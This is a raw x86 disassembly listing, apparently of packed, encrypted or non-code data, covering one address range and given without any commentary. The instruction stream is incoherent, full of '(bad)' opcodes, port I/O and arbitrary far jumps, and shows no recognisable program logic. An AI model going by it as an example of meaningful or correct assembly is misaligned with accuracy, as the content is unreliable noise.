  4071b3:	scas   al,BYTE PTR es:[edi]
  4071b4:	imul   esi,DWORD PTR [edi+eax*8-0x156ebdae],0xffffffee
  4071bc:	out    0xd0,eax
  4071be:	pusha  
  4071bf:	or     DWORD PTR [esi],ebx
  4071c1:	and    al,0x4b
  4071c3:	sbb    al,0xc1
  4071c5:	popa   
  4071c6:	mov    dl,0xef
  4071c8:	jne    0x407176
  4071ca:	jmp    0x4071a9
  4071cc:	pusha  
  4071cd:	inc    eax
  4071ce:	cdq    
  4071cf:	test   DWORD PTR [eax],eax
  4071d1:	fimul  DWORD PTR [edx-0x6fb49f9b]
  4071d7:	pop    ebx
  4071d8:	xchg   esi,eax
  4071d9:	push   ebp
  4071da:	xchg   ebx,eax
  4071db:	daa    
  4071dc:	sbb    al,0x87
  4071de:	push   esp
  4071df:	nop
  4071e0:	mov    edx,0xa57c3fd2
  4071e5:	test   eax,0x3162d482
  4071ea:	pop    es
  4071eb:	sub    bl,BYTE PTR [ebp+0x3e]
  4071ee:	or     eax,0xe2f950d2
  4071f3:	sahf   
  4071f4:	mov    cl,BYTE PTR [ebx]
  4071f6:	in     eax,0x3
  4071f8:	sbb    al,0x41
  4071fa:	pop    ebp
  4071fb:	or     eax,0xb9532b34
  407200:	jae    0x4071e6
  407202:	and    al,0xaf
  407204:	in     eax,0xaa
  407206:	jo     0x407203
  407208:	xchg   edx,eax
  407209:	repz push ss
  40720b:	ds fs std 
  40720e:	fdiv   QWORD PTR [ebp+0x6001817]
  407214:	fisubr DWORD PTR [esi+eiz*2]
  407217:	xchg   esi,eax
  407218:	cmp    eax,0x3ddcb4f7
  40721d:	inc    esi
  40721e:	push   edi
  40721f:	mov    bh,0xbd
  407221:	inc    esp
  407222:	mov    ebp,0xe5ec6c10
  407227:	imul   edi,ebx,0xffffff90
  40722a:	repnz sbb BYTE PTR [ebx+ecx*2-0x6],bl
  40722f:	pop    ds
  407230:	lahf   
  407231:	int3   
  407232:	cmc    
  407233:	enter  0x2eed,0xf2
  407237:	adc    al,0x30
  407239:	adc    ch,BYTE PTR [ecx+ebp*8]
  40723c:	jg     0x4071cd
  40723e:	retf   
  40723f:	mov    ebx,0x4d54f42b
  407244:	mov    bh,0xc
  407246:	pusha  
  407247:	cmc    
  407248:	test   bh,al
  40724a:	lods   al,BYTE PTR ds:[esi]
  40724b:	lds    esp,FWORD PTR [ebx+0x20]
  40724e:	adc    al,0xc
  407250:	or     DWORD PTR [edx+edi*2],ebx
  407253:	mov    al,0x85
  407255:	rol    BYTE PTR [esi+ecx*1+0x2c],0xa8
  40725a:	test   BYTE PTR [eax],0xf3
  40725d:	sbb    BYTE PTR [eax+0x5f],bl
  407260:	ins    BYTE PTR es:[edi],dx
  407261:	mov    ecx,0xfaadd624
  407266:	(bad)
  407269:	mov    bh,0x9f
  40726b:	aaa    
  40726c:	push   0xd51bc936
  407271:	or     DWORD PTR [ebp+esi*8+0x6aad58a3],ecx
  407278:	jecxz  0x4072f8
  40727a:	jno    0x40725c
  40727c:	inc    ecx
  40727d:	jecxz  0x40722e
  40727f:	mov    ah,0xe5
  407281:	mov    cl,0xe0
  407283:	out    0xb1,eax
  407285:	cmp    BYTE PTR [ebx+0x63],dl
  407288:	daa    
  407289:	mov    eax,ds:0xcb5c47c6
  40728e:	out    0x2f,al
  407290:	adc    al,0xfe
  407292:	jle    0x4072ab
  407294:	popa   
  407295:	out    dx,eax
  407296:	adc    dl,al
  407298:	pop    esp
  407299:	cmp    edi,DWORD PTR [ebx]
  40729b:	cmp    BYTE PTR [eax-0x44],bl
  40729e:	iret   
  40729f:	ins    BYTE PTR es:[edi],dx
  4072a0:	mov    edx,0xd6fbb759
  4072a5:	(bad)  
  4072a7:	xor    dl,dh
  4072a9:	sub    al,0xa3
  4072ab:	lahf   
  4072ac:	push   ecx
  4072ad:	xor    al,0x20
  4072af:	test   DWORD PTR [esp+edx*2+0x78],ecx
  4072b3:	adc    al,0x4
  4072b5:	inc    ebp
  4072b6:	clc    
  4072b7:	dec    ebx
  4072b8:	push   0x78b36215
  4072bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072be:	mov    esi,DWORD PTR [ecx+0x3c]
  4072c1:	pop    eax
  4072c2:	push   ss
  4072c3:	(bad)
  4072c8:	mov    DWORD PTR ds:0x5c7bfac3,0x1e62cf4c
  4072d2:	mov    bl,0x9d
  4072d4:	out    0xa7,al
  4072d6:	call   0x4e50e6b6
  4072db:	std    
  4072dc:	add    al,0x2a
  4072de:	aam    0x7
  4072e0:	popa   
  4072e1:	cmp    al,0x7c
  4072e3:	aam    0xe4
  4072e5:	mov    esp,0x9dd843df
  4072ea:	gs ss sub cl,cl
  4072ee:	or     eax,0xb17880e5
  4072f3:	fnstsw WORD PTR [edx+0x52]
  4072f6:	(bad)  
  4072f7:	pop    ss
  4072f8:	jnp    0x40729a
  4072fa:	mov    ecx,0xbcf02a37
  4072ff:	mov    bl,al
  407301:	jmp    0x82bdc682
  407306:	sbb    DWORD PTR ds:0x4d13c52c,0xffffffdd
  40730d:	int    0xb
  40730f:	xor    edx,DWORD PTR [ebp-0x292d8147]
  407315:	push   0xf78f2cc6
  40731a:	mov    esp,0x9579f912
  40731f:	test   al,0x9b
  407321:	ja     0x407355
  407323:	shl    DWORD PTR [edx+edi*8-0x54],1
  407327:	xor    DWORD PTR [edi-0x7d],0x53
  40732b:	div    BYTE PTR [edx]
  40732d:	inc    ebx
  40732e:	adc    eax,0xee496bdb
  407333:	je     0x4072da
  407335:	and    BYTE PTR [ecx+0x62],al
  407338:	aam    0x14
  40733a:	out    0x4b,al
  40733c:	int    0xde
  40733e:	pushf  
  40733f:	cli    
  407340:	adc    al,0xba
  407342:	push   eax
  407343:	jl     0x40734f
  407345:	leave  
  407346:	jns    0x407301
  407348:	cmp    BYTE PTR [edx+0x6fc210c7],cl
  40734e:	dec    edi
  40734f:	xchg   ebp,eax
  407350:	ror    al,1
  407352:	jbe    0x4072d4
  407354:	mov    ah,0xfc
  407356:	(bad)  
  407357:	fdiv   QWORD PTR [esp+ebp*4]
  40735a:	jl     0x40731c
  40735c:	in     al,dx
  40735d:	pop    es
  40735e:	gs push 0xd5a3f8f
  407364:	arpl   WORD PTR [eax+0x16b8549f],bp
  40736a:	adc    dl,BYTE PTR [esi+0xd]
  40736d:	mov    esp,0xace340b
  407372:	fimul  WORD PTR [ebp+0x5d]
  407375:	sub    esi,DWORD PTR [edi]
  407377:	cmp    al,0x5a
  407379:	sbb    al,0xa6
  40737b:	popa   
  40737c:	or     cl,ah
  40737e:	pop    ebx
  40737f:	jne    0x4073ce
  407381:	or     ebp,DWORD PTR [edx-0x63]
  407384:	add    eax,0xcee14254
  407389:	inc    edi
  40738a:	mov    eax,ds:0xc114128b
  40738f:	scas   eax,DWORD PTR es:[edi]
  407390:	xor    eax,0x8ef57d8d
  407395:	into   
  407396:	sbb    eax,0x4a52dccb
  40739b:	imul   edi,esi,0xdc62bc52
  4073a1:	out    dx,eax
  4073a2:	stos   DWORD PTR es:[edi],eax
  4073a3:	mov    ecx,0x88f470b6
  4073a8:	test   al,0x50
  4073aa:	(bad)  
  4073ab:	adc    al,0x68
  4073ad:	push   ds
  4073ae:	sbb    ah,BYTE PTR [ebp+0x7f403502]
  4073b4:	pop    edi
  4073b5:	ins    DWORD PTR es:[edi],dx
  4073b6:	pop    edi
  4073b7:	or     BYTE PTR [esi],al
  4073b9:	test   al,dl
  4073bb:	std    
  4073bc:	adc    BYTE PTR [edx+0x78a49a25],bh
  4073c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073c3:	mov    WORD PTR [ecx+ecx*4],fs
  4073c6:	les    eax,FWORD PTR [esi+0x5dc0ec27]
  4073cc:	js     0x4073c4
  4073ce:	not    ah
  4073d0:	retf   0xcde6
  4073d3:	add    DWORD PTR [ebx+esi*4-0x70],ecx
  4073d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d8:	aas    
  4073d9:	xor    eax,DWORD PTR [ebp-0x4f]
  4073dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073dd:	sahf   
  4073de:	dec    esi
  4073df:	loopne 0x40739c
  4073e1:	mov    edx,0x2cc25240
  4073e6:	int    0xae
  4073e8:	mov    edx,0x371349b7
  4073ed:	jl     0x407465
  4073ef:	xchg   edi,eax
  4073f0:	out    0xbe,eax
  4073f2:	sub    dh,BYTE PTR [ecx]
  4073f4:	cdq    
  4073f5:	xchg   ecx,eax
  4073f6:	bound  edi,QWORD PTR [ecx-0xa30150d]
  4073fc:	stos   BYTE PTR es:[edi],al
  4073fd:	gs into 
  4073ff:	jge    0x407434
  407401:	inc    edx
  407402:	lea    esp,[esi+0x79]
  407405:	push   ds
  407406:	rcl    cl,cl
  407408:	pushf  
  407409:	cmp    eax,0xcb8bfb74
  40740e:	outs   dx,BYTE PTR ds:[esi]
  40740f:	cwde   
  407410:	jae    0x4073a8
  407412:	fstp   QWORD PTR [ecx-0x5bab98e2]
  407418:	loopne 0x40743e
  40741a:	inc    ebx
  40741b:	xchg   esp,eax
  40741c:	xor    BYTE PTR [edx],ch
  40741e:	fstp   DWORD PTR [esi+0xd480b19]
  407424:	push   es
  407425:	cmp    BYTE PTR [eax+ebx*2+0x28de78b8],0x42
  40742d:	aaa    
  40742e:	adc    BYTE PTR [esi-0x535fc317],0x12
  407435:	aad    0x6d
  407437:	jecxz  0x4073e1
  407439:	jns    0x4074b2
  40743b:	inc    edx
  40743c:	out    dx,eax
  40743d:	ds (bad) 
  40743f:	xchg   ebp,eax
  407440:	test   eax,0xefbd9ad
  407445:	sbb    esi,edi
  407447:	loop   0x407414
  407449:	jl     0x4073e5
  40744b:	jbe    0x407477
  40744d:	jae    0x4073e4
  40744f:	mov    bh,0x6d
  407451:	mov    bh,0x2f
  407453:	fimul  DWORD PTR [edx-0x4e05c550]
  407459:	mov    ch,0x89
  40745b:	xor    al,0xef
  40745d:	jns    0x407493
  40745f:	gs jg  0x4073f7
  407462:	retf   0x35fe
  407465:	repz xor esi,0x52934965
  40746c:	sub    bh,BYTE PTR [ebx]
  40746e:	(bad)  
  40746f:	out    dx,eax
  407470:	pop    ss
  407471:	lods   al,BYTE PTR ds:[esi]
  407472:	lds    ebp,FWORD PTR [esi-0x4d193560]
  407478:	in     al,0x54
  40747a:	dec    ecx
  40747b:	arpl   WORD PTR [edi+0x6326edc6],cx
  407481:	cmp    al,0xec
  407483:	outs   dx,DWORD PTR ds:[esi]
  407484:	push   eax
  407485:	sub    BYTE PTR [edi-0x28],0x7d
  407489:	fwait
  40748a:	(bad)  
  40748b:	aam    0x62
  40748d:	fsub   QWORD PTR [eax]
  40748f:	nop
  407490:	aad    0xac
  407492:	std    
  407493:	pop    ss
  407494:	nop
  407495:	mov    eax,ds:0x63ac9f55
  40749a:	nop
  40749b:	addr16 and bh,cl
  40749e:	jmp    0x9c765423
  4074a3:	push   ss
  4074a4:	(bad)  [ebx]
  4074a6:	adc    eax,0xb1fe7bfc
  4074ab:	(bad)  
  4074ac:	jl     0x407481
  4074ae:	imul   ebp,esp,0x2a
  4074b1:	or     DWORD PTR [esi-0x1],edi
  4074b4:	(bad)  [esi-0x746ebe21]
  4074ba:	imul   edx,DWORD PTR [eax+0x3409a1e5],0x6b978353
  4074c4:	test   DWORD PTR [edx],esi
  4074c6:	outs   dx,BYTE PTR ds:[esi]
  4074c7:	sti    
  4074c8:	mov    ds:0x403a29c9,eax
  4074cd:	jle    0x407536
  4074cf:	push   esi
  4074d0:	xchg   esi,eax
  4074d1:	sbb    eax,0xeeb49fb6
  4074d6:	mov    esi,0x33ca298c
  4074db:	test   BYTE PTR [esi+0x20629b9b],cl
  4074e1:	xchg   edi,eax
  4074e2:	or     edx,DWORD PTR [eax+edi*2+0x8]
  4074e6:	sub    esi,DWORD PTR [eax+ebx*2-0x74]
  4074ea:	push   ebp
  4074eb:	inc    eax
  4074ec:	and    bh,cl
  4074ee:	dec    edx
  4074ef:	jmp    0x25116294
  4074f4:	cmp    al,0x1f
  4074f6:	jecxz  0x407546
  4074f8:	idiv   DWORD PTR [esi+0x40626590]
  4074fe:	push   0xffffffa2
  407500:	mov    ch,0x44
  407502:	lahf   
  407503:	repz adc ch,BYTE PTR [edx+0x7fc88d9a]
  40750a:	cmp    dh,0x88
  40750d:	loope  0x4074d5
  40750f:	lahf   
  407510:	nop
  407511:	jg     0x4074bb
  407513:	loop   0x407590
  407515:	mov    ah,0x53
  407517:	ins    BYTE PTR es:[edi],dx
  407518:	idiv   al
  40751a:	inc    edx
  40751b:	in     eax,dx
  40751c:	je     0x4074ba
  40751e:	cmp    bl,al
  407520:	cmp    bl,BYTE PTR [esi]
  407522:	(bad)  
  407523:	adc    eax,0xa5727518
  407528:	xchg   BYTE PTR [ebp+0x28],cl
  40752b:	int3   
  40752c:	pushf  
  40752d:	fsubr  QWORD PTR [ebp+0x15]
  407530:	add    ch,ah
  407532:	arpl   WORD PTR [edi],dx
  407534:	ins    DWORD PTR es:[edi],dx
  407535:	in     eax,0x9a
  407537:	mov    ah,0x2a
  407539:	dec    ebp
  40753a:	add    ah,BYTE PTR [ebx+0x6e017608]
  407540:	loop   0x407553
  407542:	xchg   DWORD PTR [eax],edx
  407544:	fidiv  DWORD PTR [esi]
  407546:	sbb    eax,0x4e5fc433
  40754b:	lea    ebp,[ebx-0x2c]
  40754e:	jae    0x407582
  407550:	call   0xb5b9:0x97d7112f
  407557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407558:	sbb    DWORD PTR [edi+0x1de49f85],esp
  40755e:	pop    esi
  40755f:	dec    edi
  407560:	lods   al,BYTE PTR ds:[esi]
  407561:	adc    ch,BYTE PTR [ebx+eiz*8-0x7712bde1]
  407568:	out    dx,al
  407569:	mov    ds:0xd02604cb,eax
  40756e:	in     eax,0xa7
  407570:	in     al,dx
  407571:	ret    0x93bd
  407574:	sbb    al,0xd6
  407576:	push   0x3
  407578:	aad    0x36
  40757a:	mov    ch,0x8e
  40757c:	jmp    0x9d123b20
  407581:	retf   
  407582:	pusha  
  407583:	jmp    0x2df2:0x898e8fc4
  40758a:	mov    al,0xc2
  40758c:	jl     0x40751f
  40758e:	sub    esi,DWORD PTR [ebx-0x2f]
  407591:	aas    
  407592:	inc    edx
  407593:	pop    ss
  407594:	jmp    0x18c9:0xee6ce971
  40759b:	cmp    DWORD PTR [eax],0x8
  40759e:	inc    ebx
  40759f:	clc    
  4075a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075a1:	inc    edi
  4075a2:	fldenv [edi+0x3c8942e5]
  4075a8:	hlt    
  4075a9:	jl     0x4075c0
  4075ab:	fsub   DWORD PTR [ebx-0x38449b29]
  4075b1:	hlt    
  4075b2:	call   0xa699:0xe9a40bd2
  4075b9:	mov    dh,0x93
  4075bb:	sbb    DWORD PTR [ebx+ecx*4-0x57],ecx
  4075bf:	not    esp
  4075c1:	shl    BYTE PTR [edx+0xc],cl
  4075c4:	loop   0x407567
  4075c6:	lock pop edx
  4075c8:	sub    cl,BYTE PTR [esi+0x54]
  4075cb:	sub    edi,DWORD PTR [edx]
  4075cd:	call   0xd40e:0x2c3b6949
  4075d4:	or     al,0xfe
  4075d6:	mov    al,al
  4075d8:	ret    
  4075d9:	xor    bh,BYTE PTR [eax+0x57c09642]
  4075df:	int    0x7e
  4075e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075e2:	xchg   BYTE PTR [edx-0xe],al
  4075e5:	test   eax,0xde2ba4ac
  4075ea:	pop    ebx
  4075eb:	sahf   
  4075ec:	inc    BYTE PTR [edx-0x3a]
  4075ef:	test   eax,0xb3624195
  4075f4:	push   edx
  4075f5:	mov    al,ds:0x19639d3b
  4075fa:	sub    dh,BYTE PTR [ebp-0x7d107dff]
  407600:	push   0x70cb88d6
  407605:	xchg   edx,eax
  407606:	push   esi
  407607:	es push 0xa581566d
  40760d:	jb     0x40759b
  40760f:	cmp    esp,esp
  407611:	ds push ss
  407613:	ja     0x4075a9
  407615:	mov    bl,0xdc
  407617:	(bad)  
  407618:	lahf   
  407619:	lods   eax,DWORD PTR ds:[esi]
  40761a:	push   ebp
  40761b:	mov    edx,0x2a82aaf6
  407620:	xchg   ebx,eax
  407621:	loop   0x4075d7
  407623:	imul   eax,DWORD PTR [edi+0x18b0dd0],0xcea5008d
  40762d:	mov    BYTE PTR [ecx+0x7c92be0c],ah
  407633:	out    dx,al
  407634:	ficom  DWORD PTR [esi]
  407636:	jmp    0x407654
  407638:	iret   
  407639:	test   al,0xbb
  40763b:	je     0x4076aa
  40763d:	fldz   
  40763f:	cmp    al,0xf4
  407641:	push   ss
  407642:	cs xchg edx,eax
  407644:	out    dx,eax
  407645:	pop    esp
  407646:	rcl    DWORD PTR es:[edi+0x59a5c5b6],0xa
  40764e:	and    esp,DWORD PTR [edi]
  407650:	aam    0x4
  407652:	dec    esi
  407653:	bound  ebx,QWORD PTR [edx]
  407655:	int3   
  407656:	push   ebx
  407657:	ds xchg ebx,eax
  407659:	push   edi
  40765a:	pop    esi
  40765b:	scas   al,BYTE PTR es:[edi]
  40765c:	(bad)  
  40765e:	std    
  40765f:	push   ss
  407660:	aaa    
  407661:	mov    ds:0xb3b361c0,eax
  407666:	(bad)  
  407667:	mov    esp,0x4abd7ef7
  40766c:	test   bh,cl
  40766e:	ret    0x69d5
  407671:	mov    al,ds:0x89b7e0ce
  407676:	stos   BYTE PTR es:[edi],al
  407677:	inc    ecx
  407678:	adc    eax,0x93d6937f
  40767d:	inc    ebx
  40767e:	in     al,dx
  40767f:	xchg   edi,eax
  407680:	out    dx,al
  407681:	(bad)  
  407682:	and    al,0xaf
  407684:	or     eax,0x5496fadf
  407689:	mov    bh,0xb3
  40768b:	sub    DWORD PTR [ecx],esp
  40768d:	xor    eax,DWORD PTR [edx+0x14]
  407690:	and    ecx,ecx
  407692:	sub    BYTE PTR [edi+0x63],dl
  407695:	sbb    DWORD PTR [ecx+0x2a6aeaab],0x509b8a2c
  40769f:	mov    BYTE PTR [eax+0x70],bl
  4076a2:	pusha  
  4076a3:	ds dec eax
  4076a5:	sub    eax,0x40e3b9db
  4076aa:	push   ebp
  4076ab:	pop    esi
  4076ac:	add    eax,0x63182cfc
  4076b1:	mov    ah,BYTE PTR [ecx+0x48]
  4076b4:	or     ah,BYTE PTR [ebp+0x18]
  4076b7:	retf   0x62b0
  4076ba:	pop    edx
  4076bb:	xchg   esi,eax
  4076bc:	fwait
  4076bd:	push   0xec61205f
  4076c2:	sub    al,0x8d
  4076c4:	fwait
  4076c5:	pop    esi
  4076c6:	imul   edi,DWORD PTR [edx-0x60ddccc],0xbbe98e29
  4076d0:	adc    eax,0x3de2848
  4076d5:	fwait
  4076d6:	mov    dh,0x87
  4076d8:	mov    eax,0x6f929381
  4076dd:	repnz cmp al,0x84
  4076e0:	js     0x40766a
  4076e2:	push   ebp
  4076e3:	and    DWORD PTR [edi-0x1b],edx
  4076e6:	cwde   
  4076e7:	adc    cl,BYTE PTR [eax+0x20219ef0]
  4076ed:	mov    ss,WORD PTR [edx]
  4076ef:	(bad)  [edx-0x6b]
  4076f2:	data16 mov bh,0x70
  4076f5:	jp     0x407697
  4076f7:	ret    0xd675
  4076fa:	je     0x40775f
  4076fc:	xor    ecx,DWORD PTR [eax]
  4076fe:	push   ebx
  4076ff:	cdq    
  407700:	jns    0x407685
  407702:	mov    WORD PTR [ebp+0xe],cs
  407705:	sbb    al,BYTE PTR [ebp-0x741805d]
  40770b:	xor    DWORD PTR [ebx],esi
  40770d:	test   eax,0x4f8df40e
  407712:	js     0x407713
  407714:	lods   al,BYTE PTR ds:[esi]
  407715:	ja     0x4076fa
  407717:	and    edx,0x14a555fd
  40771d:	sbb    al,0xb4
  40771f:	cmp    al,BYTE PTR [edi+0xc]
  407722:	sub    bl,BYTE PTR [ecx+0x72f51a57]
  407728:	lahf   
  407729:	add    ah,BYTE PTR [edi-0x656a9be0]
  40772f:	scas   eax,DWORD PTR es:[edi]
  407730:	loopne 0x4076f5
  407732:	fbld   TBYTE PTR [ebp+0x50]
  407735:	call   DWORD PTR [esi+0x13b662bc]
  40773b:	and    al,0x23
  40773d:	jecxz  0x4076fb
  40773f:	xor    eax,0xca8d3042
  407744:	fcomp  DWORD PTR [ebp-0x312bd9d6]
  40774a:	cmp    BYTE PTR [esi+0x50],0x8e
  40774e:	jge    0x4077ce
  407750:	pop    ds
  407751:	cli    
  407752:	push   ebx
  407753:	xchg   ecx,eax
  407754:	inc    ecx
  407755:	lods   al,BYTE PTR ds:[esi]
  407756:	xchg   edi,eax
  407757:	sar    DWORD PTR [edi-0x28],1
  40775a:	test   BYTE PTR es:[edi+0x5e964477],dh
  407761:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  407763:	xor    eax,0xbd3deb20
  407768:	je     0x4077ac
  40776a:	int    0x98
  40776c:	ja     0x407713
  40776e:	js     0x40771b
  407770:	(bad)  
  407771:	in     eax,0x51
  407773:	lahf   
  407774:	sahf   
  407775:	xor    ecx,DWORD PTR [edx+edi*1+0x20]
  407779:	leave  
  40777a:	pop    edi
  40777b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40777c:	cs gs fucomp st(0)
  407780:	jl     0x407780
  407782:	cmp    BYTE PTR [ecx],al
  407784:	addr16 sub al,0x96
  407787:	jmp    0x40771c
  407789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40778a:	movsx  esi,cx
  40778d:	pop    ds
  40778e:	fdivr  st(7),st
  407790:	inc    ecx
  407791:	test   BYTE PTR [ecx-0x3],dl
  407794:	iret   
  407795:	pop    esp
  407796:	call   0x3976:0x1fa66c5c
  40779d:	mov    bh,0x35
  40779f:	mov    gs,WORD PTR [eax]
  4077a1:	in     al,0x11
  4077a3:	loop   0x4077f6
  4077a5:	mov    esp,0xe667661d
  4077aa:	mov    ch,0xc8
  4077ac:	lods   al,BYTE PTR ds:[esi]
  4077ad:	or     DWORD PTR [edi+0x4cd745eb],eax
  4077b3:	pop    ebp
  4077b4:	push   ss
  4077b5:	pop    ebx
  4077b6:	in     al,0xf8
  4077b8:	push   ss
  4077b9:	pop    ebx
  4077ba:	test   BYTE PTR [ebx-0x10c69c50],0xfd
  4077c1:	dec    ebp
  4077c2:	lock pop es
  4077c4:	inc    edx
  4077c5:	(bad)
  4077c9:	and    edx,esp
  4077cb:	push   esp
  4077cc:	lods   al,BYTE PTR ds:[esi]
  4077cd:	xor    ah,dh
  4077cf:	sbb    al,0xb2
  4077d1:	aaa    
  4077d2:	mov    edx,0xefc08775
  4077d7:	xor    BYTE PTR [edi+0xa],0x62
  4077db:	test   eax,0x9487032d
  4077e0:	loopne 0x407808
  4077e2:	ret    0x555b
  4077e5:	pop    eax
  4077e6:	fstp   TBYTE PTR [eax-0xbde71b9]
  4077ec:	in     al,0xe1
  4077ee:	data16 fmul QWORD PTR [edx]
  4077f1:	daa    
  4077f2:	gs push eax
  4077f4:	add    BYTE PTR [edi+0x61],0xe3
  4077f8:	push   ebx
  4077f9:	aad    0x99
  4077fb:	cmp    DWORD PTR [edx+0x59],ebx
  4077fe:	cmc    
  4077ff:	mov    DWORD PTR [ecx*1+0xae62d49],esi
  407806:	rol    bl,0x58
  407809:	xlat   BYTE PTR ds:[ebx]
  40780a:	dec    esi
  40780b:	inc    ebx
  40780c:	(bad)  
  40780d:	mov    ecx,0x7d47f04a
  407812:	jnp    0x4077a4
  407814:	(bad)  
  407815:	call   0xfeb5:0x91200e7b
  40781c:	push   0xb72153cd
  407821:	mov    dh,0xc8
  407823:	sub    edi,ecx
  407825:	in     eax,dx
  407826:	sbb    dl,BYTE PTR [eax+0x78]
  407829:	in     eax,0xde
  40782b:	inc    esi
  40782c:	mov    ds:0x97bf844c,eax
  407831:	lods   al,BYTE PTR ds:[esi]
  407832:	sub    DWORD PTR [ecx-0x77691a48],0xffffff81
  407839:	call   0xc2ff:0x2965be58
  407840:	mov    esp,0xe7f623ad
  407845:	test   DWORD PTR [edi-0x5076c935],eax
  40784b:	jno    0x40789b
  40784d:	ficom  DWORD PTR [esi+0x10]
  407850:	ds sbb ebp,ecx
  407853:	or     ch,BYTE PTR [edx+0x771e5dc6]
  407859:	dec    eax
  40785a:	dec    edx
  40785b:	jo     0x40789b
  40785d:	push   0xfffffffa
  40785f:	in     al,dx
  407860:	cmp    BYTE PTR [ecx],0xd3
  407863:	xchg   ebp,eax
  407864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407865:	retf   0xea0f
  407868:	jmp    0x7ca9:0xd673ba5a
  40786f:	or     DWORD PTR [esi],0x16
  407872:	jecxz  0x407887
  407874:	out    dx,al
  407875:	push   cs
  407876:	and    BYTE PTR [eax+0x4d],dh
  407879:	xor    bl,ah
  40787b:	pop    esi
  40787c:	sub    al,0xd5
  40787e:	or     DWORD PTR [ecx+0x634e4f76],ebx
  407884:	jecxz  0x407856
  407886:	es bswap ecx
  407889:	inc    eax
  40788a:	fdiv   QWORD PTR [esi-0x6358c483]
  407890:	mov    edx,fs
  407892:	jb     0x4078da
  407894:	stos   BYTE PTR es:[edi],al
  407895:	test   cl,dl
  407897:	dec    eax
  407898:	sbb    DWORD PTR [ebx],ebx
  40789a:	pop    edi
  40789b:	iret   
  40789c:	mov    esp,0xc94d450f
  4078a1:	out    0x2e,al
  4078a3:	out    dx,eax
  4078a4:	daa    
  4078a5:	inc    ecx
  4078a6:	dec    ebp
  4078a7:	cli    
  4078a8:	test   esp,ecx
  4078aa:	(bad)  
  4078ab:	mov    ebp,0x478dd46b
  4078b0:	cmp    BYTE PTR [ecx+0x2a],ah
  4078b3:	pop    esp
  4078b4:	hlt    
  4078b5:	adc    DWORD PTR [ecx+eiz*2],0xffffffa3
  4078b9:	inc    esi
  4078ba:	rol    esp,cl
  4078bc:	scas   eax,DWORD PTR es:[edi]
  4078bd:	jmp    0x40793a
  4078bf:	mov    esp,DWORD PTR [ebp+0x18]
  4078c2:	scas   al,BYTE PTR es:[edi]
  4078c3:	loope  0x407853
  4078c5:	mov    dh,0xa4
  4078c7:	mov    BYTE PTR [edi],bh
  4078c9:	pop    ebx
  4078ca:	or     eax,0x4c6aebc
  4078cf:	jnp    0x407895
  4078d1:	xor    al,BYTE PTR [ebp+ebx*2+0x3c8196e5]
  4078d8:	fwait
  4078d9:	push   esi
  4078da:	test   BYTE PTR [eax-0x2bb16302],ch
  4078e0:	xor    bh,ah
  4078e2:	inc    esi
  4078e3:	js     0x407883
  4078e5:	sti    
  4078e6:	loopne 0x407938
  4078e8:	int    0xbf
  4078ea:	imul   ebx,eax,0xe81a1e9e
  4078f0:	fbld   TBYTE PTR [edx-0x5b]
  4078f3:	mov    dl,0x5e
  4078f5:	sbb    eax,ecx
  4078f7:	(bad)  
  4078f8:	das    
  4078f9:	inc    edi
  4078fa:	or     BYTE PTR [ecx+ecx*2+0x19],0x4b
  4078ff:	(bad)  
  407900:	jo     0x4078a1
  407902:	xchg   esi,eax
  407903:	pop    ebx
  407904:	hlt    
  407905:	scas   al,BYTE PTR es:[edi]
  407906:	mov    dh,0x4a
  407908:	or     bl,BYTE PTR [ecx]
  40790a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40790b:	mov    ebx,eax
  40790d:	sbb    al,0x41
  40790f:	jp     0x407921
  407911:	and    edi,0xffffff8a
  407914:	mov    ds:0x37bac577,al
  407919:	jns    0x4078f8
  40791b:	dec    ebp
  40791c:	pop    ebx
  40791d:	ds push cs
  40791f:	sbb    DWORD PTR [eax+0x4874f39c],0x5e720471
  407929:	out    0x9a,ax
  40792c:	push   es
  40792d:	inc    eax
  40792e:	retf   
  40792f:	push   ebx
  407930:	dec    ebp
  407931:	cmp    DWORD PTR [ecx-0x36],edi
  407934:	mov    dh,dh
  407936:	mov    eax,ds:0x4614c2b1
  40793b:	cwde   
  40793c:	sbb    al,0xfc
  40793e:	adc    ecx,DWORD PTR [eax+eiz*4+0x56c29ebd]
  407945:	shr    DWORD PTR [esi+ecx*2-0x261cb6c3],0xd9
  40794d:	add    eax,DWORD PTR [edi]
  40794f:	mov    edx,edi
  407951:	cli    
  407952:	adc    ah,BYTE PTR ds:0x5720e561
  407958:	bound  edi,QWORD PTR [eax+0x32d82c5]
  40795e:	shl    DWORD PTR [edx-0x38489a25],cl
  407964:	inc    esi
  407965:	sti    
  407966:	call   0x115d:0xc5642cfd
  40796d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40796e:	lahf   
  40796f:	pop    ecx
  407970:	(bad)  [eax-0x6faafdb6]
  407976:	inc    esp
  407977:	fidiv  DWORD PTR [ebx]
  407979:	cmp    ah,BYTE PTR [edi-0x78]
  40797c:	mov    bp,WORD PTR [ebp+0x3f49e1ff]
  407983:	bound  ecx,QWORD PTR [ecx-0x6860723c]
  407989:	adc    esi,DWORD PTR [esi]
  40798b:	out    dx,al
  40798c:	mov    bl,0x8b
  40798e:	fadd   QWORD PTR [edi]
  407990:	lea    ecx,[edi-0x3f]
  407993:	cmp    al,0xe3
  407995:	inc    esi
  407996:	imul   edi,DWORD PTR [eax+0x109b95c7],0xffffffb0
  40799d:	mov    WORD PTR [esi+ecx*1],ds
  4079a0:	pop    edx
  4079a1:	fisubr DWORD PTR [edx+ebp*4+0x44ad23fc]
  4079a8:	imul   edi,ebx,0x1c8b98b1
  4079ae:	rcr    DWORD PTR [ebx-0x6ecbe0d3],1
  4079b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b5:	ja     0x40794b
  4079b7:	stc    
  4079b8:	jne    0x4079cc
  4079ba:	or     ch,BYTE PTR [esi+0xc011e0a]
